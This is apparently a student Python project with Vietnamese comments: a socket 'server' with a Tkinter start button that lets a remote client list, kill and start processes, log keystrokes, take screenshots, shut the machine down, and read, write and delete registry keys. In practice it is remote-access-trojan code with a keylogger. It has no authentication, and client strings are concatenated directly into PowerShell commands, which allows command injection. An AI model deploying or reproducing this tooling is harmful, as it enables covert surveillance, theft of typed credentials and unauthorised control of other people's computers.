def Server_Running():
    #Bật server lên
    import socket
    HOST = ''  
    PORT = 1233
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    HOST = str(ip_address)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(2)
    print(HOST+':'+str(PORT))
    client, addr = server.accept()
    print('Connected by', addr)

    #Function cho server:

    def App_running(HOST, PORT):
        import subprocess
        cmd = 'powershell "Get-Process |where {$_.mainWindowTItle} |Select-Object id, name, @{Name=\'ThreadCount\';Expression ={$_.Threads.Count}}| format-table'
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)

        count = 0
        size = 0
        list_name = ['' for i in range(100)]
        list_id = ['' for i in range(100)]
        list_thread = ['' for i in range(100)]

        for line in proc.stdout:
            if line.rstrip():
                if count < 2:
                    count += 1
                    continue
                str_line = str(line.decode().rstrip().lstrip())
                str_line = " ".join(str_line.split())
                list_id_name_thread = str_line.split(" ", 3)
                list_thread[size] = list_id_name_thread[2]
                list_name[size] = list_id_name_thread[1]
                list_id[size] = list_id_name_thread[0]
                size += 1

        client.sendall(bytes(str(size),"utf8"))

        for i in range(size):
            client.sendall(bytes(list_id[i],"utf8"))
            check = client.recv(1024)

        for i in range(size):
            client.sendall(bytes(list_name[i], "utf8"))
            check = client.recv(1024)
            
        for i in range(size):
            client.sendall(bytes(list_thread[i], "utf8"))
            check = client.recv(1024)
    def App_running_kill(ID_App):
        import subprocess
        cmd = 'powershell taskkill /F /PID ' + ID_App
        try:
            proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE)
            return 1
        except:
            return 0
    def App_start(Name):
        import subprocess
        cmd = 'powershell start ' + Name
        try:
            proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE)
            return 1
        except:
            return 0
    def hook():
        from threading import Thread
        import threading
        import pynput
        import time
        from pynput.keyboard import Key, Listener, Controller

        keyboard = Controller()
        keys = []
        KeyStop = True

        def Stop():
            nonlocal KeyStop
            while True:
                if KeyStop == True:
                    try:
                        while True:                       
                            check = client.recv(1024).decode("utf8")
                            print(check)
                            if check == "Unhook Key":                 
                                KeyStop = False
                                break
                    finally:
                        keyboard.release(Key.space)
                break
        def KeyLogger():
            while True:
                def on_press(key):
                    nonlocal keys
                    keys.append(key)
                def on_release(key):
                    if KeyStop == False: listener.stop()
                with Listener(on_release = on_release, on_press = on_press) as listener:
                    listener.join()

                def write(keys):
                    global count
                    count = 0
                    keylog = ''
                    for key in keys:
                        k = str(key).replace("'","")
                        if(str(k) == "Key.backspace"):
                            k = " Backspace "
                        elif(str(k) == "Key.space"):
                            k = " "
                        elif(str(k) == "Key.shift"):
                            k = ""
                        k = str(k).replace("Key.cmd","")                    
                        k = str(k).replace("Key.","")
                        k = str(k).replace("<","")
                        k = str(k).replace(">","")
                        if(str(k) == 96):
                            k = "0"
                        elif(str(k) == 97):
                            k = "1"
                        elif(str(k) == 98):
                            k = "2"
                        elif(str(k) == 99):
                            k = "3"
                        elif(str(k) == 100):
                            k = "4"
                        elif(str(k) == 101):
                            k = "5"
                        elif(str(k) == 102):
                            k = "6"
                        elif(str(k) == 103):
                            k = "7"
                        elif(str(k) == 104):
                            k = "8"
                        elif(str(k) == 105):
                            k = "9"
                        k = str(k).replace("cmd","fn")
                        k = str(k).replace("enter","Enter")
                        k = str(k).replace("tab","")
                        k = str(k).replace("esc","ESC")
                        k = str(k).replace("num_lock","")
                        k = str(k).replace("caps_lock","")
                        k = str(k).replace("shift_l","")
                        k = str(k).replace("shift_r","")
                        k = str(k).replace("ctrl_l","")
                        k = str(k).replace("ctrl_r","")
                        k = str(k).replace("alt_l","")
                        k = str(k).replace("alt_gr","")
                        k = str(k).replace("delete","Del")
                        k = str(k).replace("print_screen","PrtSc")
                        k = str(k).replace("home","Home")
                        keylog += k
                        count+=1
                    return keylog[0:]

                data = write(keys)
                if data == "": data = " "
                client.sendall(bytes(data,"utf8"))
                check = client.recv(1024).decode("utf8")
                keys.clear()
                break
        t2 = threading.Thread(target=KeyLogger)
        t1 = threading.Thread(target=Stop)
        t1.start()
        t2.start()
        t2.join()
    def Recieve_Close():
        import os
        os.system('shutdown -s -t 30')
        #time la thoi gian set up tat may tuy y
    def Screenshot():
        import pyautogui
        image = pyautogui.screenshot()
        image = image.resize((500,400)) 
        image.save("scrshot.png")
        try:
            # open image ======
            myfile = open("scrshot.png", 'rb')
            bytes = myfile.read()
            #gui du lieu qua client
            client.sendall(bytes)
            myfile.close()
        except:
            print("Khong the chup man hinh")
    def Process_running():
        import subprocess

        cmd = 'powershell "Get-Process | Select-Object id, name, @{Name=\'ThreadCount\';Expression ={$_.Threads.Count}}| format-table'
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)

        count = 0
        size = 0
        list_name = ['' for i in range(100000)]
        list_id = ['' for i in range(100000)]
        list_thread = ['' for i in range(100000)]

        for line in proc.stdout:
            if line.rstrip():
                if count < 2:
                    count += 1
                    continue
                str_line = str(line.decode().rstrip().lstrip())
                str_line = " ".join(str_line.split())
                list_id_name_thread = str_line.split(" ", 3)
                list_thread[size] = list_id_name_thread[2]
                list_name[size] = list_id_name_thread[1]
                list_id[size] = list_id_name_thread[0]
                size += 1

        client.sendall(bytes(str(size),"utf8"))
        for i in range(size):
            client.sendall(bytes(list_id[i],"utf8"))
            check = client.recv(1024)

        for i in range(size):
            client.sendall(bytes(list_name[i], "utf8"))
            check = client.recv(1024)

        for i in range(size):
            client.sendall(bytes(list_thread[i], "utf8"))
            check = client.recv(1024)
    def Process_running_kill(ID_App):
        import subprocess
        cmd = 'powershell taskkill /F /PID ' + ID_App
        try:
            proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE)
            return 1
        except:
            return 0
    def Process_start(Name):
        import subprocess
        cmd = 'powershell start ' + Name
        try:
            proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE)
            return 1
        except:
            return 0
    def NhanReg():
        data = client.recv(1024).decode("utf8")
        client.sendall(bytes("Ok Nhan Reg","utf8"))

        writefile = open("data.reg","w")
        writefile.write(data)

        import subprocess    
        cmd = 'powershell reg import data.reg'
        subprocess.Popen(cmd, shell=True)

    def LayRegValue():
        import winreg
        Name = client.recv(1024).decode("utf8")
        client.sendall(bytes("Ok Nhan Name","utf8"))
        Link = client.recv(1024).decode("utf8")
        client.sendall(bytes("Ok Nhan Link","utf8"))
        hkey = Link.split("\\",1)
        check= True
        if hkey[0] == "HKEY_CLASSES_ROOT":
            keylink = winreg.HKEY_CLASSES_ROOT
        elif hkey[0] == "HKEY_CURRENT_USER":
            keylink = winreg.HKEY_CURRENT_USER
        elif hkey[0] == "HKEY_LOCAL_MACHINE":
            keylink = winreg.HKEY_LOCAL_MACHINE
        elif hkey[0] == "HKEY_USERS":
            keylink = winreg.HKEY_USERS
        elif hkey[0] == "HKEY_CURRENT_CONFIG":
            keylink = winreg.HKEY_CURRENT_CONFIG
        else:
            client.sendall(bytes("Sai duong dan", "utf8"))
            check = client.recv(1024).decode("utf8")
            return
        
        with winreg.ConnectRegistry(None, keylink) as winKey:
            try:
                with winreg.OpenKey(winKey, hkey[1], 0, winreg.KEY_ALL_ACCESS) as sub_key:
                    i = 0
                    while True:
                        try:
                            value = winreg.EnumValue(sub_key, i)
                            if value[0] == Name: 
                                client.sendall(bytes(value[1],"utf8"))
                                check = client.recv(1024).decode("utf8")
                                break
                            i+=1
                        except:
                            client.sendall(bytes("Khong tim thay", "utf8"))
                            check = client.recv(1024).decode("utf8")
                            break
            except:
                client.sendall(bytes("Sai duong dan", "utf8"))
                check = client.recv(1024).decode("utf8")
    def SetValue():
        import winreg
        Name = client.recv(1024).decode("utf8")
        client.sendall(bytes("Name recieved","utf8"))
        Link = client.recv(1024).decode("utf8")
        client.sendall(bytes("Link recieved","utf8"))
        data_type = client.recv(1024).decode("utf8")
        client.sendall(bytes("Data type recieved","utf8"))
        value = client.recv(2048).decode("utf8")
        client.sendall(bytes("Value recieved","utf8"))

        hkey = Link.split("\\", 1)
        check= True
        if hkey[0] == "HKEY_CLASSES_ROOT":
            keylink = winreg.HKEY_CLASSES_ROOT
        elif hkey[0] == "HKEY_CURRENT_USER":
            keylink = winreg.HKEY_CURRENT_USER
        elif hkey[0] == "HKEY_LOCAL_MACHINE":
            keylink = winreg.HKEY_LOCAL_MACHINE
        elif hkey[0] == "HKEY_USERS":
            keylink = winreg.HKEY_USERS
        elif hkey[0] == "HKEY_CURRENT_CONFIG":
            keylink = winreg.HKEY_CURRENT_CONFIG
        else:
            client.sendall(bytes("Sai duong dan", "utf8"))
            check = client.recv(1024).decode("utf8")
            return

        with winreg.ConnectRegistry(None, keylink) as winKey:
            try:
                with winreg.OpenKey(winKey, hkey[1], 0, winreg.KEY_ALL_ACCESS) as sub_key:
                    if data_type == "Kiểu dữ liệu": 
                        client.sendall(bytes("fail", "utf8"))
                        check = client.recv(1024).decode("utf8")
                        return
                    elif data_type == "String": 
                        winreg.SetValueEx(sub_key, Name, 0, winreg.REG_SZ,value)
                    elif data_type == "Binary": 
                        winreg.SetValueEx(sub_key, Name, 0, winreg.REG_BINARY,value.encode('latin-1'))
                    elif data_type == "DWORD": 
                        winreg.SetValueEx(sub_key, Name, 0, winreg.REG_DWORD,int(value))
                    elif data_type == "QWORD": 
                        winreg.SetValueEx(sub_key, Name, 0, winreg.REG_QWORD,int(value))
                    elif data_type == "Multi-string": 
                        arr = value.split()
                        winreg.SetValueEx(sub_key, Name, 0, winreg.REG_MULTI_SZ,arr)
                    elif data_type == "Expandable String": 
                        winreg.SetValueEx(sub_key, Name, 0, winreg.REG_EXPAND_SZ,value)
                    client.sendall(bytes("succeed", "utf8"))
                    check = client.recv(1024).decode("utf8")  
            except:
                client.sendall(bytes("Sai duong dan", "utf8"))
                check = client.recv(1024).decode("utf8")
    def Createkey():
        import winreg

        Link = client.recv(1024).decode("utf8")
        client.sendall(bytes("Ok Nhan Link","utf8"))
        hkey = Link.split("\\",1)

        if hkey[0] == "HKEY_CLASSES_ROOT":
            keylink = winreg.HKEY_CLASSES_ROOT
        elif hkey[0] == "HKEY_CURRENT_USER":
            keylink = winreg.HKEY_CURRENT_USER
        elif hkey[0] == "HKEY_LOCAL_MACHINE":
            keylink = winreg.HKEY_LOCAL_MACHINE
        elif hkey[0] == "HKEY_USERS":
            keylink = winreg.HKEY_USERS
        elif hkey[0] == "HKEY_CURRENT_CONFIG":
            keylink = winreg.HKEY_CURRENT_CONFIG
        else:
            client.sendall(bytes("Sai duong dan", "utf8"))
            check = client.recv(1024).decode("utf8")
            return
        cn = winreg.ConnectRegistry(None, keylink)
        ok = winreg.OpenKey(cn, r"",0,winreg.KEY_ALL_ACCESS)    
        ck = winreg.CreateKeyEx(ok, hkey[1], 0, winreg.KEY_ALL_ACCESS)
        client.sendall(bytes("Da tao thanh cong","utf8"))
        check = client.recv(1024).decode("utf8")
    def Deletekey():
        import winreg

        Link = client.recv(1024).decode("utf8")
        client.sendall(bytes("Ok Nhan Link","utf8"))
        hkey = Link.split("\\",1)
        

        if hkey[0] == "HKEY_CLASSES_ROOT":
            keylink = winreg.HKEY_CLASSES_ROOT
        elif hkey[0] == "HKEY_CURRENT_USER":
            keylink = winreg.HKEY_CURRENT_USER
        elif hkey[0] == "HKEY_LOCAL_MACHINE":
            keylink = winreg.HKEY_LOCAL_MACHINE
        elif hkey[0] == "HKEY_USERS":
            keylink = winreg.HKEY_USERS
        elif hkey[0] == "HKEY_CURRENT_CONFIG":
            keylink = winreg.HKEY_CURRENT_CONFIG
        else:
            client.sendall(bytes("Sai duong dan", "utf8"))
            check = client.recv(1024).decode("utf8")
            return
        
        def deleteSubkey(key, s_key):

            open_key = winreg.OpenKey(key, s_key ,0, winreg.KEY_ALL_ACCESS)
            infokey = winreg.QueryInfoKey(open_key)
            for x in range(0, infokey[0]):
                subkey = winreg.EnumKey(open_key, 0)
                try:
                    winreg.DeleteKey(open_key, subkey)
                except:
                    deleteSubkey(key, s_key)

            winreg.DeleteKey(open_key,"")
            open_key.Close()

            access_registry = winreg.ConnectRegistry(None, keylink)
            client.sendall(bytes("Da xoa thanh cong","utf8"))
            check = client.recv(1024).decode("utf8")

        try:
            deleteSubkey(keylink, hkey[1])
        except:
            client.sendall(bytes("Sai duong dan", "utf8"))
            check = client.recv(1024).decode("utf8")
            return

    def DeleteRegValue():
        import winreg
        def del_key_1(key, sub_key, name,):
            key = winreg.OpenKey(key, sub_key ,0, winreg.KEY_ALL_ACCESS)
            winreg.DeleteValue(key, name)
            winreg.CloseKey(key)
            
               
        Link = client.recv(1024).decode("utf8")
        client.sendall(bytes("Da nhan","utf8"))
        sub_key = Link
        hkey = Link.split("\\",1)
        temp = 0
        check= True
        if hkey[0] == "HKEY_CLASSES_ROOT":
            keylink = winreg.HKEY_CLASSES_ROOT
            temp = 18
        elif hkey[0] == "HKEY_CURRENT_USER":
            keylink = winreg.HKEY_CURRENT_USER
            temp = 18
        elif hkey[0] == "HKEY_LOCAL_MACHINE":
            keylink = winreg.HKEY_LOCAL_MACHINE
            temp = 19
        elif hkey[0] == "HKEY_USERS":
            keylink = winreg.HKEY_USERS
            temp = 11
        elif hkey[0] == "HKEY_CURRENT_CONFIG":
            keylink = winreg.HKEY_CURRENT_CONFIG
            temp = 20
        else:
            check = False

        name = client.recv(1024).decode("utf8")
        client.sendall(bytes("Da nhan","utf8"))

        if check == True:
            try:
                key = winreg.ConnectRegistry(None, keylink)
                sub_key= sub_key[temp:]
                del_key_1(key,sub_key,name)  
            except:
                check = False

        yeucau = client.recv(1024).decode("utf8")
        if check == True:      
            client.sendall(bytes("Xoa value thanh cong","utf8"))  
        elif check == False:
            client.sendall(bytes("Sai duong dan", "utf8"))
    
        xacnhan = client.recv(1024).decode("utf8")       

    #Command cho server:
    while True:
        #try:
        def Command_catch(i):
            if i == "Xem App": App_running(HOST,PORT)
            elif i == "Xoa App": 
                ID_App = client.recv(1024).decode("utf8") 
                client.sendall(bytes("Da nhan ID", "utf8"))
                App_running_kill(ID_App)
            elif i == "Bat App":
                Name = client.recv(1024).decode("utf8")
                App_start(Name)
            elif i == "Hook Key": hook()
            elif i == "Shutdown" : Recieve_Close()
            elif i == "Chup man hinh": Screenshot()
            elif i == "Xem Process": Process_running()
            elif i == "Xoa Process": 
                Process_App = client.recv(1024).decode("utf8") 
                Process_running_kill(Process_App)
            elif i == "Bat Process":
                Process_Name = client.recv(1024).decode("utf8")
                Process_start(Process_Name)
            elif i == "Nhan Reg": NhanReg()
            elif i == "Get value reg": LayRegValue()
            elif i == "Create key reg": Createkey()
            elif i == "Delete Value Reg": DeleteRegValue() 
            elif i == "Delete key": Deletekey()
            elif i == "Set registry value": SetValue()
            elif i == "Create key reg": Createkey()
            elif i == "Delete key": Deletekey()

        Command = client.recv(1024).decode("utf8")
        client.sendall(bytes("Da nhan lenh","utf8"))
        print(Command)
        Command_catch(Command)
        #except:
            #print("Disconnected")
            #break
    server.close()
  
from tkinter import *
from tkinter import messagebox

mainWin = Tk()
mainWin.title("SERVER")
mainWin.geometry("200x200")
Start = Button(
        mainWin,
        text = "Khởi động server",
        width = 20,
        height = 10,
        borderwidth=5,
        command = Server_Running
    ).pack()

mainWin.mainloop()